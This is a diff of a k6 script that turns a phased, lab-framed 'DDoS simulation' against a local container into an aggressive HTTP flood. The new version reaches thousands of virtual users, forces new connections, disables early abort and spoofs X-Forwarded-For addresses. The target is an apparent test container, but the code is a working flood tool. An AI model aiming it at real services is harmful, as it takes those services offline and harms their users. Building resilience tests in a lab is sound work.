@@ -1,127 +1,92 @@
 import http from "k6/http";
-import { check, sleep } from "k6";
+import { check } from "k6";
 import { Rate, Trend } from "k6/metrics";
 
-// Custom metrics
 const errorRate = new Rate("errors");
 const responseTime = new Trend("response_time");
 
 // =============================================================
-// DDoS Simulation: HTTP Flood via Proxy
-// Target: local nginx container
-// Proxy: local squid container
+// Aggressive HTTP Flood - High volume, fast ramp
 // =============================================================
 
 export const options = {
   scenarios: {
-    // Phase 1: Normal traffic (baseline)
-    baseline: {
-      executor: "constant-arrival-rate",
-      rate: 10,
-      timeUnit: "1s",
-      duration: "30s",
-      preAllocatedVUs: 10,
-      startTime: "0s",
-      tags: { phase: "baseline" },
-    },
-
-    // Phase 2: Ramp up (attack begins)
-    ramp_up: {
-      executor: "ramping-arrival-rate",
-      startRate: 10,
-      timeUnit: "1s",
-      stages: [
-        { duration: "15s", target: 100 },
-        { duration: "15s", target: 300 },
-      ],
-      preAllocatedVUs: 200,
-      startTime: "30s",
-      tags: { phase: "ramp_up" },
-    },
-
-    // Phase 3: Full flood
+    // Massive concurrent users ramping fast
     flood: {
-      executor: "constant-arrival-rate",
-      rate: 500,
-      timeUnit: "1s",
-      duration: "30s",
-      preAllocatedVUs: 300,
-      startTime: "60s",
-      tags: { phase: "flood" },
-    },
-
-    // Phase 4: Cool down
-    cooldown: {
-      executor: "ramping-arrival-rate",
-      startRate: 500,
-      timeUnit: "1s",
+      executor: "ramping-vus",
+      startVUs: 0,
       stages: [
-        { duration: "15s", target: 50 },
-        { duration: "15s", target: 5 },
+        { duration: "5s", target: 500 },
+        { duration: "10s", target: 2000 },
+        { duration: "30s", target: 5000 },
+        { duration: "20s", target: 5000 },
+        { duration: "10s", target: 0 },
       ],
-      preAllocatedVUs: 200,
-      startTime: "90s",
-      tags: { phase: "cooldown" },
+    },
+    // Constant high-rate requests in parallel
+    burst: {
+      executor: "constant-arrival-rate",
+      rate: 5000,
+      timeUnit: "1s",
+      duration: "60s",
+      preAllocatedVUs: 3000,
+      maxVUs: 8000,
+      startTime: "5s",
     },
   },
 
+  // Disable default thresholds so k6 doesn't abort early
   thresholds: {
-    http_req_duration: ["p(95)<2000"], // Track when latency degrades
-    errors: ["rate<0.5"],
+    http_req_failed: [{ threshold: "rate<1.0", abortOnFail: false }],
   },
+
+  batch: 50,
+  batchPerHost: 50,
+  noConnectionReuse: true,    // Force new connections (more stress)
+  discardResponseBodies: true, // Don't waste memory reading responses
 };
 
-const TARGET_URL = __ENV.TARGET_URL || "http://target:80";
-const PROXY_URL = __ENV.HTTP_PROXY || "http://proxy:3128";
-
-const endpoints = ["/", "/api/data", "/health"];
+const TARGET = __ENV.TARGET_URL || "http://target:80";
+const paths = ["/", "/api/data", "/health", "/api/data?q=flood", "/api/data?page=1&size=100"];
 
 export default function () {
-  const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
-  const url = `${TARGET_URL}${endpoint}`;
-
-  // Send request through proxy
-  const params = {
+  // Fire multiple requests per iteration
+  const batch = paths.map((p) => ["GET", `${TARGET}${p}`, null, {
     headers: {
-      "User-Agent": `k6-ddos-sim/${__VU}`,
-      "X-Forwarded-For": `10.0.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+      "User-Agent": `flood/${__VU}-${__ITER}`,
+      "X-Forwarded-For": `${randIP()}`,
+      "Accept": "*/*",
+      "Connection": "close",
     },
-    timeout: "5s",
-  };
+    timeout: "3s",
+  }]);
 
-  const res = http.get(url, params);
+  const responses = http.batch(batch);
 
-  // Track metrics
-  responseTime.add(res.timings.duration);
-  errorRate.add(res.status !== 200);
+  for (const res of responses) {
+    responseTime.add(res.timings.duration);
+    errorRate.add(res.status !== 200);
+  }
+}
 
-  check(res, {
-    "status is 200": (r) => r.status === 200,
-    "response time < 500ms": (r) => r.timings.duration < 500,
-  });
+function randIP() {
+  return `${rand(1,223)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
+}
+
+function rand(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 export function handleSummary(data) {
-  const summary = {
-    total_requests: data.metrics.http_reqs.values.count,
-    avg_response_time: data.metrics.http_req_duration.values.avg.toFixed(2) + "ms",
-    p95_response_time: data.metrics.http_req_duration.values["p(95)"].toFixed(2) + "ms",
-    max_response_time: data.metrics.http_req_duration.values.max.toFixed(2) + "ms",
-    error_rate: (data.metrics.errors.values.rate * 100).toFixed(2) + "%",
-    requests_per_second: data.metrics.http_reqs.values.rate.toFixed(2),
-  };
-
-  console.log("\n====== DDoS SIMULATION REPORT ======");
-  console.log(`Total Requests:     ${summary.total_requests}`);
-  console.log(`Avg Response Time:  ${summary.avg_response_time}`);
-  console.log(`P95 Response Time:  ${summary.p95_response_time}`);
-  console.log(`Max Response Time:  ${summary.max_response_time}`);
-  console.log(`Error Rate:         ${summary.error_rate}`);
-  console.log(`Requests/sec:       ${summary.requests_per_second}`);
-  console.log("====================================\n");
-
-  return {
-    stdout: JSON.stringify(summary, null, 2),
-    "/scripts/results/summary.json": JSON.stringify(data, null, 2),
-  };
+  const m = data.metrics;
+  console.log("\n========== HTTP FLOOD REPORT ==========");
+  console.log(`Total Requests:     ${m.http_reqs.values.count}`);
+  console.log(`Requests/sec:       ${m.http_reqs.values.rate.toFixed(0)}`);
+  console.log(`Avg Response:       ${m.http_req_duration.values.avg.toFixed(1)}ms`);
+  console.log(`P95 Response:       ${m.http_req_duration.values["p(95)"].toFixed(1)}ms`);
+  console.log(`Max Response:       ${m.http_req_duration.values.max.toFixed(1)}ms`);
+  console.log(`Failed Requests:    ${(m.http_req_failed.values.rate * 100).toFixed(1)}%`);
+  console.log(`Error Rate:         ${(m.errors.values.rate * 100).toFixed(1)}%`);
+  console.log("========================================\n");
+  return { stdout: JSON.stringify(m, null, 2) };
 }
